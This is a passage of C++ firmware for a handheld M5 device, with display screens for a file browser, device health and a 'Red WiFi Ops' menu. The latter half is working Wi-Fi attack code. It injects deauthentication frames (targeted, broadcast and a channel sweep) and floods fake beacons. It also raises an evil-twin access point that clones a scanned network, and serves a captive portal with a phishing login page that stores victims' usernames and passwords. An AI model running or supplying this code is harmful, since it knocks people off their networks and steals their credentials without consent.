      g_nrfChannels[g_nrfChannelIndex], g_nrfHotChannel, g_nrfProbe.rpdHits);

    const int scaleY = wfTop + wfH + 1;
    M5.Display.drawFastHLine(0, scaleY, kScreenW, accent);
    M5.Display.setTextColor(kDimText, bg);
    M5.Display.setCursor(2, scaleY + 2);
    M5.Display.print("2400");
    M5.Display.setCursor(98, scaleY + 2);
    M5.Display.print("2462MHz");
    M5.Display.setCursor(198, scaleY + 2);
    M5.Display.print("2525");
  }

  M5.Display.setTextColor(kDimText, bg);
  M5.Display.setCursor(4, 127);
  M5.Display.print("Ent:view  ;/.:chan  Fn+S:dense  Fn+R:poll");
}

void drawFilesRootMenuScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  const char* options[] = {"Internal Flash", "SD Card"};
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setCursor(8, 8);
  M5.Display.println("Files");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 30, 224, 84, 10, kPanelAlt);
  M5.Display.drawRoundRect(8, 30, 224, 84, 10, accent);
  for (int i = 0; i < 2; ++i) {
    const int y = 40 + i * 28;
    const bool sel = i == g_filesMenuIndex;
    M5.Display.fillRoundRect(18, y, 204, 20, 5, sel ? accent : themeModeBg(mode));
    M5.Display.setTextColor(sel ? panel : kText, sel ? accent : themeModeBg(mode));
    M5.Display.setCursor(28, y + 6);
    M5.Display.println(options[i]);
  }
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println(";/ pick  Ent open  Fn+Bk");
}

void drawFilesBrowserScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setCursor(8, 8);
  M5.Display.println(storageTargetName(g_filesTarget));
  drawBatteryWidget(panel, 132);

  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(10, 28);
  M5.Display.printf("%.27s", g_filesCurrentPath.c_str());
  M5.Display.setCursor(176, 28);
  M5.Display.printf("%s", g_browserCount > 0 ? "ready" : "empty");

  M5.Display.fillRoundRect(8, 38, 224, 78, 8, kPanelAlt);
  M5.Display.drawRoundRect(8, 38, 224, 78, 8, accent);
  if (g_browserCount == 0) {
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(18, 58);
    M5.Display.println("No files yet / not mounted");
  } else {
    for (int i = 0; i < kFileVisibleRows; ++i) {
      const int idx = g_filesScroll + i;
      if (idx >= g_browserCount) break;
      const int y = 44 + i * 12;
      const bool sel = idx == g_filesSelected;
      M5.Display.fillRect(12, y, 216, 11, sel ? accent : kPanelAlt);
      M5.Display.setTextColor(sel ? panel : kText, sel ? accent : kPanelAlt);
      char kind = g_browserEntries[idx].isDir ? 'D' : 'F';
      String sizeText = g_browserEntries[idx].path == ".." ? "<up>" :
                        (g_browserEntries[idx].isDir ? "<dir>" : humanBytes(g_browserEntries[idx].size));
      M5.Display.setCursor(16, y + 2);
      M5.Display.printf("%c %-16.16s %7.7s", kind,
                        g_browserEntries[idx].name.c_str(), sizeText.c_str());
    }
  }
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Ent open  Fn+D del  Fn+Bk");
}

void drawFilesDeleteConfirmScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setCursor(8, 8);
  M5.Display.println("Delete File?");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(10, 34, 220, 68, 10, kPanelAlt);
  M5.Display.drawRoundRect(10, 34, 220, 68, 10, accent);
  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(18, 44);
  M5.Display.println(storageTargetName(g_filesTarget));
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(18, 60);
  M5.Display.printf("%.28s", g_filesDeletePath.c_str());
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Ent delete  Fn+Bk cancel");
}

void drawFilesScreen(TeamMode mode) {
  switch (g_filesView) {
    case FilesView::RootMenu:
      drawFilesRootMenuScreen(mode);
      break;
    case FilesView::Browser:
      drawFilesBrowserScreen(mode);
      break;
    case FilesView::ConfirmDelete:
      drawFilesDeleteConfirmScreen(mode);
      break;
  }
}

void drawDeviceHealthScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  StorageStats internal = getStorageStats(StorageTarget::Internal);
  StorageStats sd = getStorageStats(StorageTarget::Sd);
  int battery = getBatteryPercent();

  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setCursor(8, 8);
  M5.Display.println("Device Health");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 30, 224, 86, 8, kPanelAlt);
  M5.Display.drawRoundRect(8, 30, 224, 86, 8, accent);
  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 40);
  M5.Display.printf("Battery: %d%%", battery);
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(14, 54);
  M5.Display.printf("Internal: %s / %s", internal.mounted ? humanBytes(internal.usedBytes).c_str() : "offline",
                    internal.mounted ? humanBytes(internal.totalBytes).c_str() : "--");
  M5.Display.setCursor(14, 66);
  M5.Display.printf("Files:%u Dirs:%u", internal.fileCount, internal.dirCount);
  M5.Display.setCursor(14, 82);
  M5.Display.printf("SD Card: %s / %s", sd.mounted ? humanBytes(sd.usedBytes).c_str() : "offline",
                    sd.mounted ? humanBytes(sd.totalBytes).c_str() : "--");
  M5.Display.setCursor(14, 94);
  M5.Display.printf("Files:%u Dirs:%u", sd.fileCount, sd.dirCount);

  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Fn+R refresh  Fn+Bk back");
}

void drawWifiOpsListScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  const uint16_t soft = themeModeSoft(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println("Red WiFi Ops");
  drawBatteryWidget(panel, 132);
  M5.Display.setTextColor(kDimText, panel);
  M5.Display.setCursor(168, 8);
  M5.Display.println("recon");

  M5.Display.fillRoundRect(8, 28, 224, 92, 3, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 3, accent);
  M5.Display.drawFastHLine(14, 34, 212, kGold);

  M5.Display.setTextColor(kGold, kPanelAlt);
  M5.Display.setCursor(14, 36);
  M5.Display.printf("APs:%d", g_wifiCount);
  M5.Display.setCursor(64, 36);
  M5.Display.printf("OP:%d", g_wifiOpenCount);
  M5.Display.setCursor(104, 36);
  M5.Display.printf("N:%d", g_wifiNewCount);
  M5.Display.setCursor(144, 36);
  M5.Display.printf("G:%d", g_wifiGoneCount);
  M5.Display.setCursor(184, 36);
  M5.Display.printf("%s", wifiSortLabel());

  if (g_wifiCount <= 0) {
    M5.Display.setTextColor(kText, kPanelAlt);
    M5.Display.setCursor(14, 54);
    M5.Display.println("No APs found  Fn+R scans");
  } else {
    M5.Display.setTextColor(accent, kPanelAlt);
    M5.Display.setCursor(14, 48);
    M5.Display.println("T SSID      RS CH AU");
    const int end = (g_redWifiScroll + kWifiVisibleRows < g_wifiCount) ?
                    (g_redWifiScroll + kWifiVisibleRows) : g_wifiCount;
    for (int i = g_redWifiScroll; i < end; ++i) {
      const int row = i - g_redWifiScroll;
      const int y = 58 + (row * 9);
      const char* ssidStr = g_wifiItems[i].ssid.length() ? g_wifiItems[i].ssid.c_str() : "<hidden>";
      if (i == g_redWifiSelected) {
        M5.Display.fillRoundRect(12, y - 1, 216, 8, 2, accent);
        M5.Display.setTextColor(WHITE, accent);
      } else {
        M5.Display.setTextColor(kText, kPanelAlt);
      }
      char marker = '.';
      if (g_wifiItems[i].auth == WIFI_AUTH_OPEN)           marker = '!';
      else if (g_wifiItems[i].auth == WIFI_AUTH_WEP)       marker = 'W';
      else if (g_wifiItems[i].evilTwinSuspect)             marker = 'E';
      else if (g_wifiItems[i].captivePortalSuspect)        marker = 'P';
      else if (g_wifiItems[i].isNew)                       marker = '+';
      M5.Display.setCursor(14, y);
      M5.Display.printf("%c %-9.9s %3d %2d %-3s", marker, ssidStr,
                        g_wifiItems[i].rssi, g_wifiItems[i].channel,
                        authLabel(g_wifiItems[i].auth));
    }
    M5.Display.setTextColor(soft, kPanelAlt);
    M5.Display.setCursor(176, 48);
    M5.Display.printf("%d/%d", g_redWifiSelected + 1, g_wifiCount);
  }

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Ent:ops ;/.:move S:sort R:scan");
}

void drawWifiOpsDetailScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  const WifiScanItem& item = g_wifiItems[g_redWifiSelected];
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println("WiFi Detail");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 28, 224, 92, 3, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 3, accent);
  M5.Display.drawFastHLine(14, 34, 212, kGold);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 36);
  M5.Display.println("SSID");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 36);
  M5.Display.printf("%.9s", item.ssid.length() ? item.ssid.c_str() : "<hidden>");

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 50);
  M5.Display.println("BSSID");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 50);
  M5.Display.printf("%.17s", item.bssid.c_str());

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 64);
  M5.Display.println("RSSI");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 64);
  M5.Display.printf("%d dBm %+d", item.rssi, item.rssi - item.prevRssi);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 78);
  M5.Display.println("Chan");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 78);
  M5.Display.printf("%d", item.channel);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 92);
  M5.Display.println("Auth");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 92);
  M5.Display.println(authLabel(item.auth));

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(116, 36);
  M5.Display.println("Tgt");
  M5.Display.setTextColor(kGold, kPanelAlt);
  M5.Display.setCursor(154, 36);
  if (item.auth == WIFI_AUTH_OPEN)          M5.Display.print("OPEN");
  else if (item.auth == WIFI_AUTH_WEP)      M5.Display.print("WEP");
  else if (item.evilTwinSuspect)            M5.Display.print("TWIN");
  else if (item.captivePortalSuspect)       M5.Display.print("PTRL");
  else                                      M5.Display.print("ENC");

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(116, 50);
  M5.Display.println("Risk");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(154, 50);
  M5.Display.printf("%d", item.riskScore);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(116, 64);
  M5.Display.println("Dup");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(154, 64);
  M5.Display.println(item.duplicateSsid ? "yes" : "no");

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(116, 78);
  M5.Display.println("Hide");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(154, 78);
  M5.Display.println(item.hidden ? "yes" : "no");

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(116, 92);
  M5.Display.println("Flag");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(154, 92);
  bool anyFlag = false;
  if (item.evilTwinSuspect)      { M5.Display.print("E"); anyFlag = true; }
  if (item.captivePortalSuspect) { M5.Display.print("P"); anyFlag = true; }
  if (item.macSpoofSuspect)      { M5.Display.print("M"); anyFlag = true; }
  if (!anyFlag) M5.Display.print(".");

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Ent list  Fn+Bk back");
}

void drawWifiActionMenuScreen(TeamMode mode);
void drawWifiAttackScreen(TeamMode mode);

void drawWifiMainMenuScreen(TeamMode mode);

void drawWifiOpsScreen(TeamMode mode) {
  switch (g_redWifiState) {
    case WifiOpsState::MainMenu:   drawWifiMainMenuScreen(mode);   break;
    case WifiOpsState::ActionMenu: drawWifiActionMenuScreen(mode); break;
    case WifiOpsState::Detail:     drawWifiOpsDetailScreen(mode);  break;
    case WifiOpsState::Attacking:  drawWifiAttackScreen(mode);     break;
    default:                       drawWifiOpsListScreen(mode);    break;
  }
}

static const char* kWifiTopLabels[] = {
  "Scan Targets", "Evil AP", "Captive Portal", "Beacon Flood", "Deauth Sweep"
};
static const char* kWifiTopDesc[] = {
  "Pick AP, attack",
  "Rogue open AP",
  "AP + phish page",
  "Ghost net flood",
  "Deauth CH 1-13",
};

static const char* kWifiMenuLabels[] = { "Deauth", "Evil AP", "Portal", "Flood", "Detail" };
static const char* kWifiMenuDesc[] = {
  "Deauth frames",
  "Clone as open AP",
  "Clone + phish",
  "Ghost AP flood",
  "View details",
};

void drawWifiMainMenuScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println("Red WiFi Ops");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 28, 224, 92, 3, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 3, accent);
  M5.Display.drawFastHLine(14, 34, 212, kGold);

  for (int i = 0; i < 5; ++i) {
    const int y = 36 + (i * 14);
    if (i == g_redWifiTopMenuSel) {
      M5.Display.fillRoundRect(12, y, 216, 12, 2, accent);
      M5.Display.setTextColor(WHITE, accent);
    } else {
      M5.Display.setTextColor(kText, kPanelAlt);
    }
    M5.Display.setCursor(16, y + 2);
    M5.Display.printf("%-14.14s %.21s", kWifiTopLabels[i], kWifiTopDesc[i]);
  }

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Ent go  ;/. pick  Fn+Bk");
}

void drawWifiActionMenuScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println("WiFi Attack Menu");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 28, 224, 92, 3, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 3, accent);
  M5.Display.drawFastHLine(14, 34, 212, kGold);

  if (g_wifiCount > 0 && g_redWifiSelected < g_wifiCount) {
    const WifiScanItem& t = g_wifiItems[g_redWifiSelected];
    const char* ssidStr = t.ssid.length() ? t.ssid.c_str() : "<hidden>";
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 36);
    M5.Display.printf(">> %-15.15s CH%d", ssidStr, t.channel);
  }

  for (int i = 0; i < 5; ++i) {
    const int y = 47 + (i * 13);
    if (i == g_redWifiMenuSel) {
      M5.Display.fillRoundRect(12, y - 1, 216, 11, 2, accent);
      M5.Display.setTextColor(WHITE, accent);
    } else {
      M5.Display.setTextColor(kText, kPanelAlt);
    }
    M5.Display.setCursor(16, y + 1);
    M5.Display.printf("%-7.7s %.18s", kWifiMenuLabels[i], kWifiMenuDesc[i]);
  }

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Ent go  ;/. pick  Fn+Bk");
}

void parseMacStr(const char* str, uint8_t* out) {
  for (int i = 0; i < 6; ++i) {
    out[i] = (uint8_t)strtol(str, nullptr, 16);
    str += 3;
  }
}

void sendDeauthFrame(const uint8_t* bssid, bool toStation) {
  uint8_t frame[26] = {
    0xC0, 0x00,                         // deauth frame
    0x00, 0x00,                         // duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // DA broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SA = bssid
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID = bssid
    0x00, 0x00,                         // seq
    0x07, 0x00,                         // reason 7: class 3 from non-assoc
  };
  memcpy(frame + 10, bssid, 6);
  memcpy(frame + 16, bssid, 6);
  esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
  if (toStation) {
    // flip DA and SA to also hit associated stations
    memcpy(frame + 4, bssid, 6);
    memcpy(frame + 10, bssid, 6);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
  }
}

void sendBeaconFrame(const char* ssid, int channel, const uint8_t* bssid) {
  const int ssidLen = strlen(ssid);
  uint8_t frame[128];
  int pos = 0;
  // Frame control: beacon
  frame[pos++] = 0x80; frame[pos++] = 0x00;
  // Duration
  frame[pos++] = 0x00; frame[pos++] = 0x00;
  // DA broadcast
  for (int i = 0; i < 6; ++i) frame[pos++] = 0xFF;
  // SA = bssid
  memcpy(frame + pos, bssid, 6); pos += 6;
  // BSSID
  memcpy(frame + pos, bssid, 6); pos += 6;
  // Seq
  frame[pos++] = 0x00; frame[pos++] = 0x00;
  // Timestamp (8 bytes)
  for (int i = 0; i < 8; ++i) frame[pos++] = 0x00;
  // Beacon interval 100 TU
  frame[pos++] = 0x64; frame[pos++] = 0x00;
  // Capabilities: ESS, short preamble
  frame[pos++] = 0x11; frame[pos++] = 0x00;
  // SSID IE
  frame[pos++] = 0x00;
  frame[pos++] = (uint8_t)ssidLen;
  memcpy(frame + pos, ssid, ssidLen); pos += ssidLen;
  // Supported rates IE
  frame[pos++] = 0x01; frame[pos++] = 0x08;
  frame[pos++] = 0x82; frame[pos++] = 0x84; frame[pos++] = 0x8B; frame[pos++] = 0x96;
  frame[pos++] = 0x0C; frame[pos++] = 0x12; frame[pos++] = 0x18; frame[pos++] = 0x24;
  // DS parameter set
  frame[pos++] = 0x03; frame[pos++] = 0x01; frame[pos++] = (uint8_t)channel;
  esp_wifi_80211_tx(WIFI_IF_STA, frame, pos, false);
}

static const char kPortalPage[] =
  "<!DOCTYPE html><html><head>"
  "<meta name='viewport' content='width=device-width,initial-scale=1'>"
  "<title>Connect</title>"
  "<style>*{box-sizing:border-box}body{font-family:sans-serif;display:flex;"
  "align-items:center;justify-content:center;min-height:100vh;margin:0;"
  "background:#f2f2f7}.box{background:#fff;padding:28px 24px;border-radius:12px;"
  "width:300px;box-shadow:0 4px 16px rgba(0,0,0,.12)}h2{margin:0 0 6px;"
  "font-size:20px;color:#1c1c1e}p{font-size:13px;color:#6e6e73;margin:0 0 18px}"
  "input{width:100%;padding:11px 12px;margin:5px 0;border:1px solid #d1d1d6;"
  "border-radius:8px;font-size:15px;outline:none}"
  "button{width:100%;padding:13px;margin-top:12px;background:#007aff;color:#fff;"
  "border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}"
  "</style></head><body><div class='box'>"
  "<h2>Sign in to WiFi</h2>"
  "<p>Your connection was interrupted. Log in to continue.</p>"
  "<form method='POST' action='/login'>"
  "<input type='text' name='user' placeholder='Email or username' required>"
  "<input type='password' name='pass' placeholder='Password' required>"
  "<button type='submit'>Continue</button>"
  "</form></div></body></html>";

static const char kPortalSuccess[] =
  "<!DOCTYPE html><html><body style='font-family:sans-serif;text-align:center;"
  "padding:60px'><h2 style='color:#34c759'>Connected!</h2>"
  "<p>You are now connected to the internet.</p></body></html>";

void stopRedWifiAttack() {
  if (g_redWifiPortalActive) {
    g_httpServer.stop();
    g_dnsServer.stop();
    g_redWifiPortalActive = false;
  }
  if (g_redWifiEvilApActive) {
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    g_redWifiEvilApActive = false;
  }
  g_redWifiAttack = WifiAttackType::None;
  g_redWifiAttackCount = 0;
}

void launchEvilAP(const char* ssid, int channel, bool withPortal) {
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  WiFi.softAP(ssid, nullptr, channel);
  g_redWifiEvilApActive = true;
  g_redWifiAttackTarget = ssid;
  if (withPortal) {
    g_portalCredCount = 0;
    g_dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
    g_dnsServer.start(53, "*", IPAddress(192,168,4,1));
    g_httpServer.on("/", HTTP_GET, []() {
      g_httpServer.send(200, "text/html", kPortalPage);
    });
    g_httpServer.on("/login", HTTP_POST, []() {
      const String user = g_httpServer.arg("user");
      const String pass = g_httpServer.arg("pass");
      if (g_portalCredCount < 8 && (user.length() || pass.length())) {
        g_portalCreds[g_portalCredCount++] = user + ":" + pass;
      }
      g_httpServer.send(200, "text/html", kPortalSuccess);
    });
    g_httpServer.onNotFound([]() {
      g_httpServer.sendHeader("Location", "http://192.168.4.1/", true);
      g_httpServer.send(302, "text/plain", "");
    });
    g_httpServer.begin();
    g_redWifiPortalActive = true;
  }
}

void startRedWifiAttack(WifiAttackType type, const char* customSsid = nullptr, int customChannel = 6) {
  stopRedWifiAttack();
  g_redWifiAttack = type;
  g_redWifiAttackCount = 0;
  g_redWifiAttackMs = millis();
  g_redWifiAttackStartMs = g_redWifiAttackMs;
  g_redWifiState = WifiOpsState::Attacking;

  const bool hasTarget = g_wifiCount > 0 && g_redWifiSelected < g_wifiCount;

  if (type == WifiAttackType::Deauth) {
    if (hasTarget) {
      g_redWifiAttackTarget = g_wifiItems[g_redWifiSelected].bssid;
      WiFi.mode(WIFI_STA);
      WiFi.disconnect(false, false);
      esp_wifi_set_channel(g_wifiItems[g_redWifiSelected].channel, WIFI_SECOND_CHAN_NONE);
      g_redWifiDeauthChannel = g_wifiItems[g_redWifiSelected].channel;
    } else {
      g_redWifiAttackTarget = "broadcast";
      WiFi.mode(WIFI_STA);
      WiFi.disconnect(false, false);
      esp_wifi_set_channel(customChannel, WIFI_SECOND_CHAN_NONE);
      g_redWifiDeauthChannel = customChannel;
    }
  } else if (type == WifiAttackType::DeauthSweep) {
    g_redWifiAttackTarget = "ch sweep";
    g_redWifiDeauthChannel = 1;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(false, false);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  } else if (type == WifiAttackType::EvilAP) {
    const char* ssid = customSsid ? customSsid
                       : (hasTarget && g_wifiItems[g_redWifiSelected].ssid.length()
                          ? g_wifiItems[g_redWifiSelected].ssid.c_str() : "Free WiFi");
    int ch = hasTarget ? g_wifiItems[g_redWifiSelected].channel : customChannel;
    launchEvilAP(ssid, ch, false);
  } else if (type == WifiAttackType::CaptivePortal) {
    const char* ssid = customSsid ? customSsid
                       : (hasTarget && g_wifiItems[g_redWifiSelected].ssid.length()
                          ? g_wifiItems[g_redWifiSelected].ssid.c_str() : "Free WiFi");
    int ch = hasTarget ? g_wifiItems[g_redWifiSelected].channel : customChannel;
    launchEvilAP(ssid, ch, true);
  } else if (type == WifiAttackType::BeaconFlood) {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(false, false);
    g_redWifiAttackTarget = "flood";
  }
}

static const char* kWifiFloodSsids[] = {
  "FBI Surveillance Van", "NSA Mobile Unit", "CIA Observation Post",
  "Free Airport WiFi",    "Starbucks Xfinity",  "ATT WiFi",
  "NETGEAR_5G",           "xfinitywifi",         "linksys",
  "DIRECT-TV",            "Google Starlite",     "Hidden Network",
};

void tickRedWifiAttack() {
  if (g_redWifiAttack == WifiAttackType::None) return;

  if (g_redWifiPortalActive) {
    g_dnsServer.processNextRequest();
    g_httpServer.handleClient();
    ++g_redWifiAttackCount;
    return;
  }

  if (g_redWifiAttack == WifiAttackType::EvilAP) {
    ++g_redWifiAttackCount;
    return;
  }

  const uint32_t now = millis();
  if (now - g_redWifiAttackMs < 80) return;
  g_redWifiAttackMs = now;

  if (g_redWifiAttack == WifiAttackType::Deauth) {
    if (g_redWifiAttackTarget == "broadcast") {
      uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
      sendDeauthFrame(bcast, false);
    } else {
      uint8_t bssid[6];
      parseMacStr(g_redWifiAttackTarget.c_str(), bssid);
      sendDeauthFrame(bssid, true);
    }
    ++g_redWifiAttackCount;
  } else if (g_redWifiAttack == WifiAttackType::DeauthSweep) {
    uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    sendDeauthFrame(bcast, false);
    ++g_redWifiAttackCount;
    if (g_redWifiAttackCount % 5 == 0) {
      g_redWifiDeauthChannel = (g_redWifiDeauthChannel % 13) + 1;
      esp_wifi_set_channel(g_redWifiDeauthChannel, WIFI_SECOND_CHAN_NONE);
    }
  } else if (g_redWifiAttack == WifiAttackType::BeaconFlood) {
    const int idx = g_redWifiAttackCount % 12;
    uint8_t fakeBssid[6];
    for (int i = 0; i < 6; ++i) fakeBssid[i] = (uint8_t)(esp_random() & 0xFF);
    fakeBssid[0] &= 0xFE;
    sendBeaconFrame(kWifiFloodSsids[idx], 1 + (g_redWifiAttackCount % 11), fakeBssid);
    ++g_redWifiAttackCount;
  }
}

void drawWifiAttackScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  const char* attackName = "ATTACKING";
  switch (g_redWifiAttack) {
    case WifiAttackType::Deauth:        attackName = "DEAUTHING";      break;
    case WifiAttackType::DeauthSweep:   attackName = "DEAUTH SWEEP";   break;
    case WifiAttackType::EvilAP:        attackName = "EVIL AP";        break;
    case WifiAttackType::CaptivePortal: attackName = "CAPTIVE PORTAL"; break;
    case WifiAttackType::BeaconFlood:   attackName = "BEACON FLOOD";   break;
    default: break;
  }
  M5.Display.println(attackName);
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 28, 224, 92, 3, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 3, accent);

  const int phase = (g_redWifiAttackCount * 5) % 400;
  const int barW = phase <= 200 ? phase : 400 - phase;
  M5.Display.fillRect(14, 34, barW, 6, accent);

  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(14, 48);
  M5.Display.printf("AP: %.22s", g_redWifiAttackTarget.c_str());

  const uint32_t elapsed = (millis() - g_redWifiAttackStartMs) / 1000;

  if (g_redWifiAttack == WifiAttackType::CaptivePortal) {
    M5.Display.setTextColor(kGold, kPanelAlt);
    M5.Display.setCursor(14, 62);
    M5.Display.printf("Clients:%d  Creds:%d", WiFi.softAPgetStationNum(), g_portalCredCount);
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 76);
    M5.Display.printf("Time: %lus  192.168.4.1", elapsed);
    if (g_portalCredCount > 0) {
